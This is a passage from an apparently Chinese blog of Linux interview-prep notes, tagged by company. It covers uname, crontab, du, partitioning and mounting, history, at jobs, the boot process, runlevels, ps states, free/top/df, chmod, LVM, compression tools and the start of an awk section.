class=\"line\">[root@VM-16-11-centos ~]# uname -r</span><br><span class=\"line\">3.10.0-1160.45.1.el7.x86_64</span><br><span class=\"line\">//3 –内核版本   10 –重大修订  0 –轻微修订  1160 –错误修复</span><br><span class=\"line\">2.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# uname -a</span><br><span class=\"line\">Linux VM-16-11-centos 3.10.0-1160.45.1.el7.x86_64 #1 SMP Wed Oct 13 17:20:51 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class=\"line\">Linux –内核名称。 如果在BSD或macOS上运行相同的命令，结果将有所不同。</span><br><span class=\"line\">VM-16-11-centos –主机名</span><br><span class=\"line\">3.10.0-1160.45.1.el7c –内核版本</span><br><span class=\"line\">#1 SMP Wed Oct 13 17:20:51 UTC 2021 – 这意味着Ubuntu编译了3.10.0-1160.45.1.el7 1次。最后的编译时间戳也在那里。</span><br><span class=\"line\">x86_64 –机器架构</span><br><span class=\"line\">x86_64 –处理器架构</span><br><span class=\"line\">x86_64 –操作系统体系结构（您可以在64位处理器上运行32位OS）</span><br><span class=\"line\">GNU/Linux –操作系统（不，它不会显示发行名称）</span><br><span class=\"line\">3.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/version</span><br><span class=\"line\">Linux version 3.10.0-1160.45.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Wed Oct 13 17:20:51 UTC 2021</span><br><span class=\"line\">4.</span><br><span class=\"line\">[root@VM-16-11-centos ~]# dmesg | grep Linux</span><br><span class=\"line\">[    0.000000] Linux version 3.10.0-1160.45.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Wed Oct 13 17:20:51 UTC 2021</span><br><span class=\"line\"></span><br><span class=\"line\">Ubuntu 完整的桌面 Linux 操作系统</span><br><span class=\"line\">Fedora 是商业版RedHat的上游。</span><br><span class=\"line\">Debian 应用程序最丰富的 Linux 发行版。</span><br><span class=\"line\">openSUSE 成为最简单易用、最广泛的发行版</span><br><span class=\"line\">kali dddd</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"crontab-的含义茄子\"><a class=\"markdownIt-Anchor\" href=\"#crontab-的含义茄子\">#</a> crontab * 的含义 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Example of job definition:</span><br><span class=\"line\"># .---------------- minute (0 - 59)</span><br><span class=\"line\"># |  .------------- hour (0 - 23)</span><br><span class=\"line\"># |  |  .---------- day of month (1 - 31)</span><br><span class=\"line\"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class=\"line\"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class=\"line\"># |  |  |  |  |</span><br><span class=\"line\"># *  *  *  *  * user-name  command to be executed</span><br><span class=\"line\"></span><br><span class=\"line\">vim /etc/crontab</span><br><span class=\"line\">crontab -u root -e</span><br><span class=\"line\">crontab -u root -l</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看linux文件夹大小茄子\"><a class=\"markdownIt-Anchor\" href=\"#查看linux文件夹大小茄子\">#</a> 查看 linux 文件夹大小 (茄子)</h4>\n<blockquote>\n<p>先来说明一件事：</p>\n<p>drwxr-xr-x   5 root root 4.0K Apr  5  2022 src<br>\ndrwxr-xr-x   2 www  www  4.0K Apr  5  2022 maomao</p>\n<ul>\n<li>文件储存在硬盘上，硬盘的最小存储单位叫做 “扇区”（Sector）。每个扇区储存 512 字节（相当于 0.5KB）。</li>\n<li>操作系统读取硬盘的时候，不会一个个扇区地读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个 “块”（block）。这种由多个扇区组成的 “块”，是文件存取的最小单位。“块” 的大小，最常见的是 4KB，即连续八个 sector 组成一个 block。</li>\n<li>文件数据都储存在 “块” 中，那么很显然，我们还必须找到一个地方储存文件的元信息，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做 inode，中文译名为 “索引节点”。</li>\n<li>每一个文件都有对应的 inode，里面包含了与该文件有关的一些信息。</li>\n</ul>\n<p>而 Linux 系统中，目录（directory）也是一种文件。打开目录，实际上就是打开目录文件。目录文件的结构非常简单，就是一系列目录项（dirent）的列表。每个目录项，由两部分组成：所包含文件的文件名，以及该文件名对应的 inode 号码。</p>\n<p><strong>所以 ls -al 命令实际显示的就是目录文件的大小。又因为 OS 定义的文件最小存取单位 “块”（block）是 4KB，所以目录一般显示为 4096B。</strong></p>\n</blockquote>\n<p>[<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWlpaWhlci9wLzg1MTEzNTEuaHRtbA==\">svc] 为何 linux ext4 文件系统目录默认大小是 4k? - _毛台 - 博客园 (cnblogs.com)</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/806469-20180305205644145-2050317113.png\" alt=\"img\" style=\"zoom:67%;\" />\n<blockquote>\n<p>[lighthouse@VM-16-11-centos ]$ du -h -d 0 sqllab/<br>\n9.2M    sqllab/</p>\n<ol>\n<li>-h , 简单可读的现实大小，自动判断 B,K,M,G…</li>\n<li>-d 0 , 现实列表深度为 0，就是只现实.kde 目录的占用，如果 - d 1 会显示第一级文件的大小，以此类推</li>\n</ol>\n<p>du -sh 命令，可查看当前文件夹的总大小</p>\n<p>du -h --max-depth=1<br>\n9.2M    ./sqllab<br>\n32K     ./maomao<br>\n59M     ./wordpress<br>\n199M    ./besides<br>\n13M     ./src<br>\n5.6M    ./sqli<br>\n223M    ./vulhub<br>\n377M    ./keshe<br>\n44M     ./html<br>\n942M    .</p>\n</blockquote>\n<h4 id=\"分区挂载过程茄子\"><a class=\"markdownIt-Anchor\" href=\"#分区挂载过程茄子\">#</a> 分区挂载过程 (茄子)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">（1）虚拟机添加硬盘</span><br><span class=\"line\"> fdisk -l</span><br><span class=\"line\">（2）分区</span><br><span class=\"line\">fdisk /dev/sdb</span><br><span class=\"line\">e 即分为逻辑分区，按 p 即分为主分区</span><br><span class=\"line\">+1024m</span><br><span class=\"line\">（3）格式化</span><br><span class=\"line\">mkfs -t ext3 -c /dev/sdb1mkfs -t ext3 -c /dev/sdb1</span><br><span class=\"line\">（4）挂载</span><br><span class=\"line\">mount /dev/sdb1 /mnt</span><br><span class=\"line\">（5）设置可以自动挂载</span><br><span class=\"line\">vim /etc/fstab</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看历史命令查看自己的和别人的深信服\"><a class=\"markdownIt-Anchor\" href=\"#查看历史命令查看自己的和别人的深信服\">#</a> 查看历史命令，查看自己的和别人的 (深信服)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">history</span><br><span class=\"line\">history命令后面可以加选项：</span><br><span class=\"line\">-c：清空历史命令（包括缓存和文件）</span><br><span class=\"line\">-w：把缓存中的历史命令写入历史命令保存文件~/.bash_history（显然每个用户有自己的文件）</span><br><span class=\"line\">-r\t将命令历史文件中的内容读入到目前shell的history记忆中【就是按↑能翻到】</span><br><span class=\"line\">数字#\t列出最近的#条命令</span><br><span class=\"line\"></span><br><span class=\"line\">历史命令最多可以保存1000条，可以在/etc/profile中进行修改：</span><br><span class=\"line\">source /etc/profile使环境变量生效。</span><br><span class=\"line\">history -c 只能清除history命令查看的，不能清除.bash_history文件中的，需要自己手动删除</span><br><span class=\"line\"></span><br><span class=\"line\">查看别人的，去别人家目录看.bash_history</span><br><span class=\"line\"></span><br><span class=\"line\">查看history时，还能看执行时间</span><br><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">export HISTTIMEFORMAT=&quot;%Y-%m-%d %H:%M:%S &quot;</span><br></pre></td></tr></table></figure>\n<h4 id=\"定时任务有哪些宏杉\"><a class=\"markdownIt-Anchor\" href=\"#定时任务有哪些宏杉\">#</a> 定时任务有哪些 (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">crontab //前面讲过</span><br><span class=\"line\">at 一次性任务</span><br><span class=\"line\">at +时间</span><br><span class=\"line\">atq</span><br><span class=\"line\">atrm jobid</span><br><span class=\"line\">at 10:00      #输入“at  时间”；开始设置at   ，支持am、pm           </span><br><span class=\"line\">at&gt; touch /home/cjk      #输入任务内容</span><br><span class=\"line\">at&gt; echo &quot;hello&quot; &gt;&gt; /home/cjk&lt;EOT&gt; </span><br></pre></td></tr></table></figure>\n<h4 id=\"linux启动过程宏杉\"><a class=\"markdownIt-Anchor\" href=\"#linux启动过程宏杉\">#</a> linux 启动过程 (宏杉)</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux系统的启动过程并不是大家想象中的那么复杂，其过程可以分为5个阶段：</span><br><span class=\"line\"></span><br><span class=\"line\">内核的引导。</span><br><span class=\"line\">\t当计算机打开电源后，首先是BIOS开机自检，按照BIOS中设置的启动设备（通常是硬盘）来启动。</span><br><span class=\"line\">\t操作系统接管硬件以后，首先读入 /boot 目录下的内核文件。</span><br><span class=\"line\">运行 init。</span><br><span class=\"line\">\tinit 进程是系统所有进程的起点，你可以把它比拟成系统所有进程的老祖宗，没有这个进程，系统中任何进程都不会启动。</span><br><span class=\"line\">\tinit 程序首先是需要读取配置文件 /etc/inittab。</span><br><span class=\"line\">\t运行级别</span><br><span class=\"line\">\t\t许多程序需要开机启动。它们在Windows叫做&quot;服务&quot;（service），在Linux就叫做&quot;守护进程&quot;（daemon）。</span><br><span class=\"line\">\t\tinit进程的一大任务，就是去运行这些开机启动的程序。</span><br><span class=\"line\">\t\tLinux允许为不同的场合，分配不同的开机启动程序，这就叫做&quot;运行级别&quot;（runlevel）。也就是说，启动时根据&quot;运行级别&quot;，确定要运行哪些程序。</span><br><span class=\"line\">系统初始化。</span><br><span class=\"line\">    在init的配置文件中有这么一行： si::sysinit:/etc/rc.d/rc.sysinit　它调用执行了/etc/rc.d/rc.sysinit</span><br><span class=\"line\">    而rc.sysinit是一个bash shell的脚本，它主要是完成一些系统初始化的工作，rc.sysinit是每一个运行级别都要首先运行的重要脚本。</span><br><span class=\"line\">    它主要完成的工作有：激活交换分区，检查磁盘，加载硬件模块以及其它一些需要优先执行任务。</span><br><span class=\"line\">建立终端 。</span><br><span class=\"line\">\trc执行完毕后，返回init。这时基本系统环境已经设置好了，各种守护进程也已经启动了。</span><br><span class=\"line\">\tinit接下来会打开6个终端，以便用户登录系统。在inittab中的以下6行就是定义了6个终端：</span><br><span class=\"line\">\t同时它会显示一个文本登录界面，这个界面就是我们经常看到的登录界面，在这个登录界面中会提示用户输入用户名</span><br><span class=\"line\">\t而用户输入的用户将作为参数传给login程序来验证用户的身份。</span><br><span class=\"line\">用户登录系统。</span><br><span class=\"line\">\t一般来说，用户的登录方式有三种：</span><br><span class=\"line\">        （1）命令行登录</span><br><span class=\"line\">        （2）ssh登录</span><br><span class=\"line\">        （3）图形界面登录</span><br></pre></td></tr></table></figure>\n<h4 id=\"linux运行级别amazon\"><a class=\"markdownIt-Anchor\" href=\"#linux运行级别amazon\">#</a> linux 运行级别 (amazon)</h4>\n<blockquote>\n<p>Linux 系统有 7 个运行级别 (runlevel)：</p>\n<ul>\n<li>运行级别 0：系统停机状态，系统默认运行级别不能设为 0，否则不能正常启动</li>\n<li>运行级别 1：单用户工作状态，root 权限，用于系统维护，禁止远程登录</li>\n<li>运行级别 2：多用户状态 (没有 NFS)</li>\n<li>运行级别 3：完全的多用户状态 (有 NFS)，登录后进入控制台命令行模式</li>\n<li>运行级别 4：系统未使用，保留</li>\n<li>运行级别 5：X11 控制台，登录后进入图形 GUI 模式</li>\n<li>运行级别 6：系统正常关闭并重启，默认运行级别不能设为 6，否则不能正常启动</li>\n</ul>\n</blockquote>\n<h4 id=\"linux进程状态汉得\"><a class=\"markdownIt-Anchor\" href=\"#linux进程状态汉得\">#</a> linux 进程状态（汉得）</h4>\n<blockquote>\n<p>3 running, 144 sleeping,   0 stopped,   1 zombie</p>\n</blockquote>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/875796-20190926175737431-422827153.png\" alt=\"img\" style=\"zoom:67%;\" />\n<h4 id=\"查看服务是否运行汉得\"><a class=\"markdownIt-Anchor\" href=\"#查看服务是否运行汉得\">#</a> 查看服务是否运行（汉得）</h4>\n<blockquote>\n<p>ps ef  和  ps aux</p>\n<p>[root@VM-16-11-centos ~]# ps -ef | grep sshd<br>\nroot      2896     1  0 Mar22 ?        00:01:56 /usr/sbin/sshd -D<br>\nroot     11786  2896  0 09:52 ?        00:00:00 sshd: lighthouse [priv]<br>\nlightho+ 11800 11786  0 09:52 ?        00:00:00 sshd: lighthouse@pts/0<br>\nroot     13538 11930  0 09:57 pts/0    00:00:00 grep --color=auto sshd</p>\n<p>ps aux 最初用到 Unix Style 中，而 ps -ef 被用在 System V Style 中，两者输出略有不同。</p>\n<p>其中 STAT 状态位常见的状态字符有<br>\n D   // 无法中断的休眠状态（通常 IO 的进程）；<br>\nR   // 正在运行可中在队列中可过行的；<br>\nS   // 处于休眠状态；<br>\nT   // 停止或被追踪；<br>\nW   // 进入内存交换 （从内核 2.6 开始无效）；<br>\nX   // 死掉的进程 （基本很少见）；<br>\nZ   // 僵尸进程；<br>\n&lt;   // 优先级高的进程<br>\n N   // 优先级较低的进程<br>\n L   // 有些页被锁进内存；<br>\ns   // 进程的领导者（在它之下有子进程）；<br>\nl   // 多线程，克隆线程（使用 CLONE_THREAD, 类似 NPTL pthreads）；<br>\n+   // 位于后台的进程组；</p>\n</blockquote>\n<h4 id=\"查看服务器cpu内存磁盘利用率linux版本汉得\"><a class=\"markdownIt-Anchor\" href=\"#查看服务器cpu内存磁盘利用率linux版本汉得\">#</a> 查看服务器 CPU，内存，磁盘利用率，linux 版本（汉得）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.查看内存使用率</span><br><span class=\"line\"></span><br><span class=\"line\">[root@VM-16-11-centos ~]# free -h</span><br><span class=\"line\">              total        used        free      shared  buff/cache   available</span><br><span class=\"line\">Mem:           1.8G        685M        149M         12M        1.0G        947M</span><br><span class=\"line\">Swap:          1.0G        374M        650M</span><br><span class=\"line\">[root@VM-16-11-centos ~]# vmstat</span><br><span class=\"line\">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class=\"line\"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class=\"line\"> 3  0 383388 153348 213388 813048    0    0     2    26    0    1  3  1 95  0  0</span><br><span class=\"line\"></span><br><span class=\"line\">2.查看CPU使用率</span><br><span class=\"line\">[root@VM-16-11-centos ~]# top</span><br><span class=\"line\">top - 10:07:30 up 217 days, 10:19,  1 user,  load average: 0.42, 0.30, 0.21</span><br><span class=\"line\">Tasks: 150 total,   3 running, 146 sleeping,   0 stopped,   1 zombie</span><br><span class=\"line\">%Cpu(s):  3.0 us,  1.0 sy,  0.0 ni, 96.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class=\"line\">[root@VM-16-11-centos ~]# cat /proc/cpuinfo  | grep physical | uniq -c</span><br><span class=\"line\">      1 physical id     : 0</span><br><span class=\"line\">      1 address sizes   : 46 bits physical, 48 bits virtual</span><br><span class=\"line\">[root@VM-16-11-centos ~]# dmidecode</span><br><span class=\"line\"># dmidecode 3.2</span><br><span class=\"line\">Getting SMBIOS data from sysfs.</span><br><span class=\"line\">SMBIOS 2.8 present.</span><br><span class=\"line\">9 structures occupying 398 bytes.</span><br><span class=\"line\">Table at 0x000F6A20.</span><br><span class=\"line\">...... </span><br><span class=\"line\"></span><br><span class=\"line\">3.查看磁盘利用率</span><br><span class=\"line\">[root@VM-16-11-centos ~]# df -h</span><br><span class=\"line\">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class=\"line\">devtmpfs        908M     0  908M   0% /dev</span><br><span class=\"line\">tmpfs           919M   32K  919M   1% /dev/shm</span><br><span class=\"line\">tmpfs           919M  1.1M  918M   1% /run</span><br><span class=\"line\">tmpfs           919M     0  919M   0% /sys/fs/cgroup</span><br><span class=\"line\">/dev/vda1        50G   21G   27G  43% /</span><br><span class=\"line\">tmpfs           184M     0  184M   0% /run/user/0</span><br><span class=\"line\">tmpfs           184M     0  184M   0% /run/user/1000</span><br><span class=\"line\">overlay          50G   21G   27G  43% /var/lib/docker/overlay2/6abafa18f5d96ab29f1273e0173f6573cb815fdfef8b88e2911fe106021c5cdc/merged</span><br><span class=\"line\">[root@VM-16-11-centos ~]# fdisk -l</span><br><span class=\"line\"></span><br><span class=\"line\">Disk /dev/vda: 53.7 GB, 53687091200 bytes, 104857600 sectors</span><br><span class=\"line\">Units = sectors of 1 * 512 = 512 bytes</span><br><span class=\"line\">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class=\"line\">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class=\"line\">Disk label type: dos</span><br><span class=\"line\">Disk identifier: 0x0009ac89</span><br><span class=\"line\"></span><br><span class=\"line\">   Device Boot      Start         End      Blocks   Id  System</span><br><span class=\"line\">/dev/vda1   *        2048   104857566    52427759+  83  Linux</span><br><span class=\"line\"></span><br><span class=\"line\">4.进程</span><br><span class=\"line\">ps -ef ps -aux</span><br><span class=\"line\"></span><br><span class=\"line\">5.内核</span><br><span class=\"line\">uname -a</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNzIxNDA2\">Linux 系统查看 CPU、机器型号、内存等信息 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h4 id=\"chmod改变文件所属者汉得\"><a class=\"markdownIt-Anchor\" href=\"#chmod改变文件所属者汉得\">#</a> chmod (改变文件所属者)（汉得）</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 777 /home/aaa/aaa.sh</span><br><span class=\"line\">chmod +x ./ssb.sh</span><br><span class=\"line\">chmod -R 644 a.txt</span><br><span class=\"line\">chmod 4775 file //设置了特殊权限位</span><br></pre></td></tr></table></figure>\n<h4 id=\"lvm宏杉吉利英伦\"><a class=\"markdownIt-Anchor\" href=\"#lvm宏杉吉利英伦\">#</a> LVM（宏杉，吉利英伦）</h4>\n<blockquote>\n<p>LVM 是逻辑盘卷管理（Logical Volume Manager）的简称，它是 Linux 环境下对磁盘分区进行管理的一种机制，LVM 是建立在硬盘和分区之上的一个逻辑层，来提高磁盘分区管理的灵活性。</p>\n<p>LVM 最大的特点就是可以对磁盘进行动态管理。因为逻辑卷的大小是可以动态调整的，而且不会丢失现有的数据。如果我们新增加了硬盘，其也不会改变现有上层的逻辑卷。作为一个动态磁盘管理机制，逻辑卷技术大大提高了磁盘管理的灵活性。</p>\n<p><strong>PV</strong>（Physical Volume）- 物理卷<br>\n物理卷在逻辑卷管理中处于最底层，它可以是实际物理硬盘上的分区，也可以是整个物理硬盘。<br>\n<strong>VG</strong>（Volumne Group）- 卷组<br>\n卷组建立在物理卷之上，一个卷组中至少要包括一个物理卷，在卷组建立之后可动态添加物理卷到卷组中。一个逻辑卷管理系统工程中可以只有一个卷组，也可以拥有多个卷组。<br>\n<strong>LV</strong>（Logical Volume）- 逻辑卷<br>\n逻辑卷建立在卷组之上，卷组中的未分配空间可以用于建立新的逻辑卷，逻辑卷建立后可以动态地扩展和缩小空间。系统中的多个逻辑卷可以属于同一个卷组，也可以属于不同的多个卷组</p>\n<p>PV 物理卷常用操作<br>\n pvcreate /dev/DEVICE: 创建 PV<br>\npvs：简要 PV 信息显示<br>\n pvdisplay：显示 PV 的详细信息<br>\n pvremove /dev/DEVICE: 移除 PV<br>\npvscan: 扫描系统中连接的所有硬盘，列出找到的物理卷列表</p>\n<p>VG 常用操作<br>\n vgcreate /dev/DEVICE: 创建 VG 卷组<br>\n vgs: 简要 VG 信息显示<br>\n vgextend：动态扩展 LVM 卷组，它通过向卷组中添加物理卷来增加卷组的容量<br>\n vgreduce：通过删除 LVM 卷组中的物理卷来减少卷组容量，不能删除 LVM 卷组中剩余的最后一个物理卷<br>\n vgdisplay：显示 VG 的详细信息<br>\n vgscan：查找系统中存在的 LVM 卷组，并显示找到的卷组列表<br>\n vgremove：删除卷组，其上的逻辑卷必须处于离线状态</p>\n<p>4、LV 常用操作<br>\n lvcreate : 用来创建 LVM 的逻辑卷<br>\n lvcreate -L #[mMgGtT] -n NAME VolumeGroup<br>\nlvs : 显示逻辑卷信息<br>\n lvscan：扫描当前系统中的所有逻辑卷，及其对应的设备文件<br>\n lvdisplay：显示逻辑卷属性<br>\n lvextend：可在线扩展逻辑卷空间<br>\n lvreduce：缩减逻辑卷空间，一般离线使用<br>\n lvremove：删除逻辑卷，需要处于离线（卸载）状态</p>\n<p><strong>缺点：</strong></p>\n<p>在从卷组中移除一个磁盘的时候必须使用 reducevg 命令（这个命令要求 root 权限，并且不允许在快照卷组中使用）。</p>\n<p>当卷组中的一个磁盘损坏时，整个卷组都会受到影响。</p>\n<p>因为加入了额外的操作，存储性能受到影响</p>\n<p>不能减小文件系统大小（受文件系统类型限制</p>\n</blockquote>\n<h4 id=\"压缩解压缩迪普汉得\"><a class=\"markdownIt-Anchor\" href=\"#压缩解压缩迪普汉得\">#</a> 压缩，解压缩 (迪普，汉得)</h4>\n<blockquote>\n<p>Linux 中可以识别的常见压缩格式，&quot;.zip&quot;、&quot;.gz&quot;、&quot;.bz2&quot;、“tar”、&quot;.tar.gz&quot;、&quot;.tar.bz2&quot; 等等</p>\n<p>1.zip 压缩</p>\n<p>zip mytxt.zip abc.txt abd.txt bcd.txt     # 把三个 txt 文件压缩成一个 zip 文件</p>\n<p>unzip -d /home/hepingfly/abc/mytxt.zip  # 如果不指定 -d 参数，默认解压到当前目录下</p>\n<p>2.gz</p>\n<p>gzip 压缩文件后会把源文件删除掉，它是不支持保留源文件的</p>\n<p>选项：<br>\n <code>-c</code> ：将压缩数据输出到标准输出中，可以用于保留源文件<br>\n <code>-d</code> ：解压缩<br>\n - r：压缩目录</p>\n<p>gzip abc.txt   # 将 abc.txt 压缩为 abc.txt.gz</p>\n<p>gzip -d   # 解压 gzip</p>\n<p>gunzip   # 解压 gzip</p>\n<p>3.bz2</p>\n<p><code>bzip2 [选项] 源文件</code> <br>\n选项：<br>\n <code>-d</code> ：解压缩<br>\n <code>-k</code> ：压缩时保留源文件<br>\n <code>-v</code> ：显示压缩的详细信息</p>\n<p>bzip2 -k bcd.txt  #压缩</p>\n<p>bzip2 -d 压缩包  # 解压</p>\n<p>bunzip2 压缩包  # 解压</p>\n<p>4.tar</p>\n<p><code>tar [选项] [-f 压缩包名] 源文件或目录</code> <br>\n选项：<br>\n <code>-c</code> ：打包</p>\n<p><code>-z</code> ：压缩和解压缩 “.tar.gz” 格式</p>\n<p><code>-f</code> ：指定压缩包的文件名。压缩包的扩展名是用来给管理员识别格式的，所以一定要正确指定扩展名。<br>\n <code>-v</code> ：显示打包文件过程</p>\n<p><code>tar [选项] 压缩包</code> <br>\n选项：<br>\n <code>-x</code> ：解打包<br>\n <code>-f</code> ：指定压缩包的文件名<br>\n <code>-v</code> ：显示解打包文件过程</p>\n<p><code>-j</code> ： 压缩和解压缩 “.tar.bz2” 格式</p>\n</blockquote>\n<h4 id=\"awk\"><a class=\"markdownIt-Anchor\" href=\"#awk\">#</a> awk</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 每行按空格或TAB分割，输出文本中的1、4项</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;&#123;print $1,$4&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 格式化输出</span></span><br><span class=\"line\"> $ awk <span class=\"string\">&#x27;&#123;printf &quot;%-8s %-10s\\n&quot;,$1,$4&#125;&#x27;</span> log.txt</span><br><span class=\"line\"><span class=\"comment\"># 使用&quot;,&quot;分割</span></span><br><span class=\"line\"> $  awk -F, <span class=\"string\">&#x27;&#123;print 